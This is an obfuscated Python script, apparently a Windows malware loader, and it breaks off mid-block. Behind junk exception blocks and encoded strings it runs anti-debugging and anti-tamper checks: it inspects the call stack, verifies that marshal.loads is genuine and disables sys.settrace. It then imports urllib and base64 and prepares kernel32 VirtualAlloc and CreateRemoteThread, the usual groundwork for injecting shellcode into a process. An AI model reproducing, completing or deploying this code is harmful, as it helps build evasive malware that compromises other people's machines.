__2919033097271 = 0
__2919033097271 += 1
try:
    raise MemoryError(__2919033097271)
except MemoryError as __7175560581640:
    if __7175560581640.args[0] == 1:
        globals()['R_E_D__A_V_______'] = bool if bool(bool(bool(bool))) < bool(type(int(1210) > int(86) < int(191) > int(188))) and bool(str(str(1918) > int(510) < int(1511) > int(17))) > 2 else bool
    if __7175560581640.args[0] == 3:
        __7179827977829 = 85748113664260
    if __7175560581640.args[0] == 4:
        __6729983544064 = 258640591091633
    if __7175560581640.args[0] == 5:
        __6478578132943 = 51821895236314
    if __7175560581640.args[0] == 6:
        __2852361537788 = 90756500282268
__8559403502674 = 0
__8559403502674 += 1
try:
    raise MemoryError(__8559403502674)
except MemoryError as __5002610173768:
    if __5002610173768.args[0] == 1:
        globals()['R_E_D__A_V______'] = str if bool(bool(bool(str))) < bool(type(int(518) > int(517) < int(162) > int(1618))) and bool(str(str(136) > int(1719) < int(716) > int(56))) > 2 else str
    if __5002610173768.args[0] == 3:
        __2922881783484 = 233239065939950
__5109748804461 = 0
__5109748804461 += 1
try:
    raise MemoryError(__5109748804461)
except MemoryError as __2946558256745:
    if __2946558256745.args[0] == 1:
        globals()['R_E_D__A_V________'] = type if bool(bool(bool(type))) < bool(type(int(68) > int(517) < int(714) > int(126))) and bool(str(str(168) > int(1619) < int(24) > int(713))) > 2 else type
    if __2946558256745.args[0] == 3:
        __2432013988947 = 13367583923740
    if __2946558256745.args[0] == 4:
        __7398706804116 = 83428259055010
    if __2946558256745.args[0] == 5:
        __4489400227694 = 259535591961020
    if __2946558256745.args[0] == 6:
        __7104274241647 = 270492770462575
    if __2946558256745.args[0] == 7:
        __7277093150413 = 217553974090392
__2224958797690 = 0
__2224958797690 += 1
try:
    raise MemoryError(__2224958797690)
except MemoryError as __8341881658901:
    if __8341881658901.args[0] == 1:
        globals()['R_E_D__A_V_____'] = int if bool(bool(bool(int))) < bool(type(int(713) > int(19) < int(613) > int(413))) and bool(str(str(24) > int(167) < int(1518) > int(168))) > 2 else int
    if __8341881658901.args[0] == 3:
        __4436623295548 = 176731651767039
__7945788365772 = 0
__7945788365772 += 1
try:
    raise MemoryError(__7945788365772)
except MemoryError as __8125372341570:
    if __8125372341570.args[0] == 1:
        globals()['R_E_D__A_V_________'] = bytes if bool(bool(bool(bytes))) < bool(type(int(1217) > int(1218) < int(52) > int(141))) and bool(str(str(175) > int(71) < int(1215) > int(1418))) > 2 else bytes
    if __8125372341570.args[0] == 3:
        __5486427517162 = 246069508303168
__3792381786608 = 0
__3792381786608 += 1
try:
    raise MemoryError(__3792381786608)
except MemoryError as __2971421674434:
    if __2971421674434.args[0] == 1:
        globals()['R_E_D__A_V__________'] = vars if bool(bool(bool(vars))) < bool(type(int(118) > int(184) < int(65) > int(64))) and bool(str(str(51) > int(1014) < int(156) > int(83))) > 2 else vars
    if __2971421674434.args[0] == 3:
        __5291936306487 = 19424142054104
__2319625904574 = 0
__2319625904574 += 1
try:
    raise MemoryError(__2319625904574)
except MemoryError as __4311247029975:
    if __4311247029975.args[0] == 1:
        globals()['R_E_D__A_V____________'] = callable if bool(bool(bool(callable))) < bool(type(int(114) > int(1210) < int(717) > int(105))) and bool(str(str(818) > int(613) < int(21) > int(1915))) > 2 else callable
    if __4311247029975.args[0] == 3:
        __7270099970613 = 189986181021814
    if __4311247029975.args[0] == 4:
        __2458904170844 = 106898623598610
__6173048702351 = 0
__6173048702351 += 1
try:
    raise MemoryError(__6173048702351)
except MemoryError as __4683423309072:
    if __4683423309072.args[0] == 1:
        globals()['R_E_D__A_V____'] = eval if bool(bool(bool(eval))) < bool(type(int(122) > int(1710) < int(133) > int(164))) and bool(str(str(617) > int(102) < int(107) > int(58))) > 2 else eval
    if __4683423309072.args[0] == 3:
        __6248779646604 = 153823565205538
__4198870214491 = 0
__4198870214491 += 1
try:
    raise MemoryError(__4198870214491)
except MemoryError as __7195284574188:
    if __7195284574188.args[0] == 1:
        globals()['______________R_E_D__A_V______________'] = list if bool(bool(bool(list))) < bool(type(int(58) > int(419) < int(218) > int(166))) and bool(str(str(17) > int(124) < int(132) > int(101))) > 2 else list
    if __7195284574188.args[0] == 3:
        __6278682352173 = 195742685193895
__7584280681824 = 0
__7584280681824 += 1
try:
    raise MemoryError(__7584280681824)
except MemoryError as __4761738229157:
    if __4761738229157.args[0] == 1:
        globals()['R_E_D__A_V______________'] = map if bool(bool(bool(map))) < bool(type(int(1519) > int(82) < int(1719) > int(1811))) and bool(str(str(715) > int(512) < int(416) > int(144))) > 2 else map
    if __4761738229157.args[0] == 3:
        __2596023949784 = 231342439175999
    if __4761738229157.args[0] == 4:
        __6508316910889 = 32220890307246
    if __4761738229157.args[0] == 5:
        __3493725481658 = 24010186509590
__6593570763724 = 0
__6593570763724 += 1
try:
    raise MemoryError(__6593570763724)
except MemoryError as __4429429251612:
    if __4429429251612.args[0] == 1:
        globals()['R_E_D__A_V___'] = __import__ if bool(bool(bool(__import__))) < bool(type(int(199) > int(178) < int(153) > int(62))) and bool(str(str(1215) > int(132) < int(41) > int(917))) > 2 else __import__
    if __4429429251612.args[0] == 3:
        __7018758961322 = 38988199086904
    if __4429429251612.args[0] == 4:
        __5035991899612 = 89512648209540
    if __4429429251612.args[0] == 5:
        __2762315180012 = 122091812144107
    if __4429429251612.args[0] == 6:
        __4000294433407 = 118311404685280
    if __4429429251612.args[0] == 7:
        __6205344223210 = 252094972311499
__4623323590057 = 0
__4623323590057 += 1
try:
    raise MemoryError(__4623323590057)
except MemoryError as __5685552779991:
    if __5685552779991.args[0] == 1:
        globals()['tryᅠ'] = print if bool(bool(bool(print))) < bool(type(int(52) > int(1119) < int(23) > int(105))) and bool(str(str(133) > int(71) < int(67) > int(516))) > 2 else print
    if __5685552779991.args[0] == 3:
        __4026650417287 = 262879483128457
__6096995673720 = 0
__6096995673720 += 1
try:
    raise MemoryError(__6096995673720)
except MemoryError as __8519418258090:
    if __8519418258090.args[0] == 1:
        globals()['exceptᅠ'] = input if bool(bool(bool(input))) < bool(type(int(913) > int(1211) < int(218) > int(216))) and bool(str(str(151) > int(161) < int(137) > int(411))) > 2 else input
    if __8519418258090.args[0] == 3:
        __4722732700198 = 123238036992854
    if __8519418258090.args[0] == 4:
        __4496624344855 = 171198029159734

def R_E_D__A_V____(RED_DEFENDER, *k):
    __3281152961457 = 0
    __3281152961457 += 1
    try:
        raise MemoryError(__3281152961457)
    except MemoryError as __6822907511275:
        if __6822907511275.args[0] == 1:
            if k:
                R_E_D____A_V = '+'
                op = '+'
            else:
                R_E_D____A_V = ''
                op = ''
        if __6822907511275.args[0] == 1:
            globals()['_42'] = (lambda: (lambda _147: _147 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()
        if __6822907511275.args[0] == 1:
            globals()['R_E_D__A_V____'] = R_E_D__A_V____
        if __6822907511275.args[0] == 1:
            globals()['R_E_D__A_V______'] = R_E_D__A_V______
        if __6822907511275.args[0] == 1:
            globals()['RED_DEFENDER'] = RED_DEFENDER
        if __6822907511275.args[0] == 1:
            for globals()['R_E_D____A_V_'] in globals()['RED_DEFENDER']:
                if not _42:
                    globals()['R_E_D____A_V_'] += (lambda: '')()
                R_E_D____A_V += R_E_D__A_V______(R_E_D____A_V_)
                f = (lambda: (lambda _812: _812 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()
        if __6822907511275.args[0] == 1:
            return R_E_D____A_V
        if __6822907511275.args[0] == 9:
            __4441536829150 = 188114570129218
        if __6822907511275.args[0] == 10:
            __6352855614588 = 217144295865035

def ______R_E_D__A_V_______(x):
    __2940752947285 = 0
    __2940752947285 += 1
    try:
        raise MemoryError(__2940752947285)
    except MemoryError as __2198889095153:
        if __2198889095153.args[0] == 1:
            return R_E_D__A_V_____(x - 30583)
        if __2198889095153.args[0] == 3:
            __7556579132110 = 181478898243844
        if __2198889095153.args[0] == 4:
            __7976745096683 = 83604423533226

def R_E_D__A_V(e):
    __4696236333034 = 0
    __4696236333034 += 1
    try:
        raise MemoryError(__4696236333034)
    except MemoryError as __5527679483009:
        if __5527679483009.args[0] == 1:
            br = bytearray(e[len(b'R_E_D__A_V__'):])
        if __5527679483009.args[0] == 1:
            r = 0
        if __5527679483009.args[0] == 1:
            for b in br:
                r = r * 256 + b
        if __5527679483009.args[0] == 1:
            return r
        if __5527679483009.args[0] == 6:
            __7182125195240 = 6311308979298
        if __5527679483009.args[0] == 7:
            __5452789309969 = 48498100299647
        if __5527679483009.args[0] == 8:
            __3506631343344 = 174888071394413

def ____________________________(x):
    __5546283514999 = 0
    __5546283514999 += 1
    try:
        raise MemoryError(__5546283514999)
    except MemoryError as __7971863446358:
        if __7971863446358.args[0] == 1:
            ar = []
        if __7971863446358.args[0] == 1:
            for i in x:
                ar.append(R_E_D__A_V____(i))
        if __7971863446358.args[0] == 1:
            return ar
        if __7971863446358.args[0] == 5:
            __7296971061193 = 233659106637857
        if __7971863446358.args[0] == 6:
            __2669882187368 = 153727160536150
        if __7971863446358.args[0] == 7:
            __4483858275461 = 161489492033694
if (lambda: (lambda _16: _16 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)():

    def R_E_D__A_V_______________(R_E_D__A_V____________):
        R_E_D__A_V____________ = R_E_D__A_V____________ - 16742655
        if R_E_D__A_V____________ <= 127:
            return R_E_D__A_V______(R_E_D__A_V_________([R_E_D__A_V____________]), 'utf8')
        elif R_E_D__A_V____________ <= 2047:
            if 1 < 2:
                b1 = 192 | R_E_D__A_V____________ >> 6
            b2 = 128 | R_E_D__A_V____________ & 63
            return R_E_D__A_V______(R_E_D__A_V_________([b1, b2]), 'utf8')
        elif R_E_D__A_V____________ <= 65535:
            b1 = 224 | R_E_D__A_V____________ >> 12
            if 2 > 1:
                b2 = 128 | R_E_D__A_V____________ >> 6 & 63
            b3 = 128 | R_E_D__A_V____________ & 63
            return R_E_D__A_V______(R_E_D__A_V_________([b1, b2, b3]), 'utf8')
        else:
            b1 = 240 | R_E_D__A_V____________ >> 18
            if 2 == 2:
                b2 = 128 | R_E_D__A_V____________ >> 12 & 63
            if 1 < 2 < 3:
                b3 = 128 | R_E_D__A_V____________ >> 6 & 63
            b4 = 128 | R_E_D__A_V____________ & 63
            return R_E_D__A_V______(R_E_D__A_V_________([b1, b2, b3, b4]), 'utf8')

    def _hex(j):
        R_E_D__A_V____________ = ''
        for _hex in j:
            R_E_D__A_V____________ += R_E_D__A_V_______________(_hex)
        return R_E_D__A_V____________
else:
    'R_E_D____A_V'
try:
    match '189' == '810':
        case True:
            raise MemoryError([True])
        case False:
            _1113 = [[True], [False]]
            R_E_D__A_V______(['_138'])
    raise MemoryError([True])
except MemoryError as _813:
    import traceback, marshal
try:
    match '918' == '711':
        case True:
            raise MemoryError([True])
        case False:
            _310 = [[True], [False]]
            R_E_D__A_V______(['_219'])
    raise MemoryError([True])
except MemoryError as _1917:
    ch = set()
try:
    match '36' == '819':
        case True:
            raise MemoryError([True])
        case False:
            _46 = [[True], [False]]
            R_E_D__A_V______(['_14'])
    raise MemoryError([True])
except MemoryError as _165:
    am = {(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742753, 16742772, 16742760, 16742763, 16742771, 16742760, 16742765, 16742770]))))())())(), (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742750, 16742764, 16742752, 16742760, 16742765, 16742750, 16742750]))))())())()}
try:
    match '1518' == '38':
        case True:
            raise MemoryError([True])
        case False:
            _1611 = [[True], [False]]
            R_E_D__A_V______(['_410'])
    raise MemoryError([True])
except MemoryError as _174:

    def vv():
        raise MemoryError((lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742717, 16742717, 16742687, 16742726, 16742734, 16742734, 16742723, 16742687, 16742731, 16742740, 16742722, 16742730, 16742688, 16742688, 16742687, 16742722, 16742734, 16742733, 16742732, 16742724, 16742732, 16742720, 16742744]))))())())()) from None
try:
    match '13' == '110':
        case True:
            raise MemoryError([True])
        case False:
            _1011 = [[True], [False]]
            R_E_D__A_V______(['_1416'])
    raise MemoryError([True])
except MemoryError as _1810:

    def cb(fn):
        if callable(fn) and fn.__module__ not in am:
            ch.add(fn.__module__)
            vv()
try:
    match '187' == '419':
        case True:
            raise MemoryError([True])
        case False:
            _93 = [[True], [False]]
            R_E_D__A_V______(['_34'])
    raise MemoryError([True])
except MemoryError as _145:

    def ba(fn):

        def hi(*args, **kwargs):
            if args and args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] in ch:
                vv()
            return fn(*args, **kwargs)
        return hi
try:
    match '179' == '217':
        case True:
            raise MemoryError([True])
        case False:
            _123 = [[True], [False]]
            R_E_D__A_V______(['_314'])
    raise MemoryError([True])
except MemoryError as _191:

    def bh():
        stack = traceback.extract_stack()
        for frame in stack[:-(lambda: R_E_D__A_V(b'R_E_D__A_V__\x02'))()]:
            if frame.filename != __file__:
                vv()
try:
    match '12' == '52':
        case True:
            raise MemoryError([True])
        case False:
            _519 = [[True], [False]]
            R_E_D__A_V______(['_159'])
    raise MemoryError([True])
except MemoryError as _119:

    def ck(fn, md):
        if callable(fn) and fn.__module__ != md:
            ch.add(md)
            raise ImportError('{}{}{}{}{}'.format('>> Detect [', fn.__name__, '] call [', md, '] ! <<')) from None
try:
    match '1618' == '172':
        case True:
            raise MemoryError([True])
        case False:
            _1513 = [[True], [False]]
            R_E_D__A_V______(['_1210'])
    raise MemoryError([True])
except MemoryError as _94:

    def ic(md, nf):
        module = __import__(md)
        funcs = nf if isinstance(nf, list) else [nf]
        [ck(getattr(module, func, None), md) for func in funcs]
try:
    match '48' == '519':
        case True:
            raise MemoryError([True])
        case False:
            _83 = [[True], [False]]
            R_E_D__A_V______(['_1619'])
    raise MemoryError([True])
except MemoryError as _174:

    def lf(val, xy):
        return callable(val) and xy and (val.__module__ != xy.__name__)
try:
    match '123' == '83':
        case True:
            raise MemoryError([True])
        case False:
            _185 = [[True], [False]]
            R_E_D__A_V______(['_615'])
    raise MemoryError([True])
except MemoryError as _117:

    def kt(lo):
        if any((lf(val, xy) for val, xy in lo)):
            vv()
try:
    match '199' == '1216':
        case True:
            raise MemoryError([True])
        case False:
            _94 = [[True], [False]]
            R_E_D__A_V______(['_139'])
    raise MemoryError([True])
except MemoryError as _168:

    def ct(md, nf):
        module = __import__(md)
        func = getattr(module, nf, None)
        if func is None:
            vv()
        tg = type(func)

        def cf(func):
            if type(func) != tg:
                vv()
        cf(func)
        return func
try:
    match '148' == '218':
        case True:
            raise MemoryError([True])
        case False:
            _14 = [[True], [False]]
            R_E_D__A_V______(['_1314'])
    raise MemoryError([True])
except MemoryError as _137:

    def ic_type(md, nf):
        func = ct(md, nf)
        ck(func, md)
try:
    match '910' == '1514':
        case True:
            raise MemoryError([True])
        case False:
            _39 = [[True], [False]]
            R_E_D__A_V______(['_1214'])
    raise MemoryError([True])
except MemoryError as _65:

    def nc():
        __import__((lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742770, 16742776, 16742770]))))())())()).settrace(lambda *args, **keys: None)
        __import__((lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742770, 16742776, 16742770]))))())())()).modules[(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742764, 16742752, 16742769, 16742770, 16742759, 16742752, 16742763]))))())())()] = None
        __import__((lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742770, 16742776, 16742770]))))())())()).modules[(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742764, 16742752, 16742769, 16742770, 16742759, 16742752, 16742763]))))())())()] = type(__import__((lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742770, 16742776, 16742770]))))())())()))((lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742764, 16742752, 16742769, 16742770, 16742759, 16742752, 16742763]))))())())())
        __import__((lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742770, 16742776, 16742770]))))())())()).modules[(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742764, 16742752, 16742769, 16742770, 16742759, 16742752, 16742763]))))())())()].loads = marshal.loads
try:
    match '1618' == '161':
        case True:
            raise MemoryError([True])
        case False:
            _68 = [[True], [False]]
            R_E_D__A_V______(['_1913'])
    raise MemoryError([True])
except MemoryError as _1118:

    def sc():
        nk = {(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742764, 16742752, 16742769, 16742770, 16742759, 16742752, 16742763]))))())())(): (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742763, 16742766, 16742752, 16742755, 16742770]))))())())()}
        [ic_type(md, nf) for md, nf in nk.items()]
        lo = [(__import__((lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742764, 16742752, 16742769, 16742770, 16742759, 16742752, 16742763]))))())())()).loads, marshal)]
        kt(lo)
        nc()
try:
    match '177' == '1719':
        case True:
            raise MemoryError([True])
        case False:
            _182 = [[True], [False]]
            R_E_D__A_V______(['_185'])
    raise MemoryError([True])
except MemoryError as _714:
    sc()
try:
    match '155' == '93':
        case True:
            raise MemoryError([True])
        case False:
            _131 = [[True], [False]]
            R_E_D__A_V______(['_216'])
    raise MemoryError([True])
except MemoryError as _312:
    bh()
try:
    match '111' == '126':
        case True:
            raise MemoryError([True])
        case False:
            _41 = [[True], [False]]
            R_E_D__A_V______(['_1615'])
    raise MemoryError([True])
except MemoryError as _17:
    import sys
try:
    match '182' == '1118':
        case True:
            raise MemoryError([True])
        case False:
            _197 = [[True], [False]]
            R_E_D__A_V______(['_1415'])
    raise MemoryError([True])
except MemoryError as _36:
    import ctypes
try:
    match '89' == '1615':
        case True:
            raise MemoryError([True])
        case False:
            _214 = [[True], [False]]
            R_E_D__A_V______(['_914'])
    raise MemoryError([True])
except MemoryError as _511:
    import base64
try:
    match '97' == '84':
        case True:
            raise MemoryError([True])
        case False:
            _72 = [[True], [False]]
            R_E_D__A_V______(['_613'])
    raise MemoryError([True])
except MemoryError as _119:
    import ctypes.wintypes as wt
try:
    match '1316' == '31':
        case True:
            raise MemoryError([True])
        case False:
            _1015 = [[True], [False]]
            R_E_D__A_V______(['_911'])
    raise MemoryError([True])
except MemoryError as _171:
    import urllib.request
try:
    match '512' == '1412':
        case True:
            raise MemoryError([True])
        case False:
            _151 = [[True], [False]]
            R_E_D__A_V______(['_1510'])
    raise MemoryError([True])
except MemoryError as _54:
    __3303719889124 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '111' == '1011':
        case True:
            raise MemoryError([True])
        case False:
            _167 = [[True], [False]]
            R_E_D__A_V______(['_1314'])
    raise MemoryError([True])
except MemoryError as _912:
    __3303719889124 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '111' == '1812':
        case True:
            raise MemoryError([True])
        case False:
            _64 = [[True], [False]]
            R_E_D__A_V______(['_158'])
    raise MemoryError([True])
except MemoryError as _184:
    try:
        raise MemoryError(__3303719889124)
    except MemoryError as __2950611569726:
        if __2950611569726.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
            kernel32 = ctypes.windll.kernel32
        if __2950611569726.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
            __2615057319311 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xf3\x10ZVF{'))()
        if __2950611569726.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x04'))():
            __2609114870975 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\x02I\xad\x92\xc6&'))()
        if __2950611569726.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x05'))():
            __6693488734217 = (lambda: R_E_D__A_V(b'R_E_D__A_V__"~\xea\xfa\x7f\xfe'))()
        if __2950611569726.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x06'))():
            __7804941173941 = (lambda: R_E_D__A_V(b'R_E_D__A_V__I\xdbt"\xe7\x06'))()
try:
    match '112' == '103':
        case True:
            raise MemoryError([True])
        case False:
            _1318 = [[True], [False]]
            R_E_D__A_V______(['_1418'])
    raise MemoryError([True])
except MemoryError as _116:
    __4905406042588 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '1816' == '169':
        case True:
            raise MemoryError([True])
        case False:
            _162 = [[True], [False]]
            R_E_D__A_V______(['_1911'])
    raise MemoryError([True])
except MemoryError as _410:
    __4905406042588 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '918' == '172':
        case True:
            raise MemoryError([True])
        case False:
            _214 = [[True], [False]]
            R_E_D__A_V______(['_212'])
    raise MemoryError([True])
except MemoryError as _1514:
    try:
        raise MemoryError(__4905406042588)
    except MemoryError as __7986688260755:
        if __7986688260755.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
            kernel32.VirtualAlloc.argtypes = (wt.LPVOID, ctypes.c_size_t, wt.DWORD, wt.DWORD)
        if __7986688260755.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
            __3919984025099 = (lambda: R_E_D__A_V(b'R_E_D__A_V__l=\xae\xb9\x04k'))()
        if __7986688260755.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x04'))():
            __4822531990672 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\x8e\x0f\xaaH\xc4='))()
        if __7986688260755.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x05'))():
            __6011752901445 = (lambda: R_E_D__A_V(b'R_E_D__A_V__!\x98\xb0\xa4[\xe7'))()
try:
    match '1910' == '54':
        case True:
            raise MemoryError([True])
        case False:
            _1618 = [[True], [False]]
            R_E_D__A_V______(['_118'])
    raise MemoryError([True])
except MemoryError as _1114:
    __7004725107234 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '142' == '1612':
        case True:
            raise MemoryError([True])
        case False:
            _117 = [[True], [False]]
            R_E_D__A_V______(['_162'])
    raise MemoryError([True])
except MemoryError as _1517:
    __7004725107234 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '1416' == '1716':
        case True:
            raise MemoryError([True])
        case False:
            _1217 = [[True], [False]]
            R_E_D__A_V______(['_136'])
    raise MemoryError([True])
except MemoryError as _15:
    try:
        raise MemoryError(__7004725107234)
    except MemoryError as __5373209783340:
        if __5373209783340.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
            kernel32.VirtualAlloc.restype = wt.LPVOID
        if __5373209783340.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
            __4493205443458 = (lambda: R_E_D__A_V(b"R_E_D__A_V__\xba'p(m\xac"))()
        if __5373209783340.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x04'))():
            __7839560806440 = (lambda: R_E_D__A_V(b'R_E_D__A_V__!\xb9\xc0\xdc@\x9d'))()
        if __5373209783340.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x05'))():
            __7245059287396 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\x1e\x0b\xb1\x19A9'))()
        if __5373209783340.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x06'))():
            __2673267954675 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\x18P%I\x10~'))()
try:
    match '176' == '132':
        case True:
            raise MemoryError([True])
        case False:
            _71 = [[True], [False]]
            R_E_D__A_V______(['_89'])
    raise MemoryError([True])
except MemoryError as _153:
    __3832051550391 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '72' == '1419':
        case True:
            raise MemoryError([True])
        case False:
            _34 = [[True], [False]]
            R_E_D__A_V______(['_145'])
    raise MemoryError([True])
except MemoryError as _1713:
    __3832051550391 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '116' == '1315':
        case True:
            raise MemoryError([True])
        case False:
            _515 = [[True], [False]]
            R_E_D__A_V______(['_1517'])
    raise MemoryError([True])
except MemoryError as _1614:
    try:
        raise MemoryError(__3832051550391)
    except MemoryError as __2239317464340:
        if __2239317464340.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
            kernel32.CreateRemoteThread.argtypes = (wt.HANDLE, wt.LPVOID, ctypes.c_size_t, wt.LPVOID, wt.LPVOID, wt.DWORD, wt.LPVOID)
        if __2239317464340.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
            __5003443610814 = (lambda: R_E_D__A_V(b'R_E_D__A_V__+\x1cqM\xffe'))()
        if __2239317464340.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x04'))():
            __2879625901407 = (lambda: R_E_D__A_V(b'R_E_D__A_V__)>\x7f\xd0i\x03'))()
        if __2239317464340.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x05'))():
            __4453218525142 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\x06\n\xe7\x02\xb4^'))()
        if __2239317464340.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x06'))():
            __8027998073246 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xc1\xfc4sP\x91'))()
        if __2239317464340.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x07'))():
            __5505850569711 = (lambda: R_E_D__A_V(b'R_E_D__A_V__,\xdc\x06-\xe9\xab'))()
try:
    match '317' == '1219':
        case True:
            raise MemoryError([True])
        case False:
            _124 = [[True], [False]]
            R_E_D__A_V______(['_1118'])
    raise MemoryError([True])
except MemoryError as _29:
    __6159775586781 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '1712' == '814':
        case True:
            raise MemoryError([True])
        case False:
            _84 = [[True], [False]]
            R_E_D__A_V______(['_1215'])
    raise MemoryError([True])
except MemoryError as _135:
    __6159775586781 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '115' == '519':
        case True:
            raise MemoryError([True])
        case False:
            _86 = [[True], [False]]
            R_E_D__A_V______(['_815'])
    raise MemoryError([True])
except MemoryError as _14:
    try:
        raise MemoryError(__6159775586781)
    except MemoryError as __6988473247757:
        if __6988473247757.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
            kernel32.CreateRemoteThread.restype = wt.HANDLE
        if __6988473247757.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
            __7186134494703 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xe6\xe2J\xfc\t\\'))()
        if __6988473247757.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x04'))():
            __6082179027806 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xebz\xfd3U\x85'))()
        if __6988473247757.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x05'))():
            __3750882378423 = (lambda: R_E_D__A_V(b'R_E_D__A_V__.p\xc6\x84\xdc\xe6'))()
        if __6988473247757.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x06'))():
            __7765706829740 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xe0j/2C\x01'))()
try:
    match '814' == '618':
        case True:
            raise MemoryError([True])
        case False:
            _1317 = [[True], [False]]
            R_E_D__A_V______(['_73'])
    raise MemoryError([True])
except MemoryError as _172:
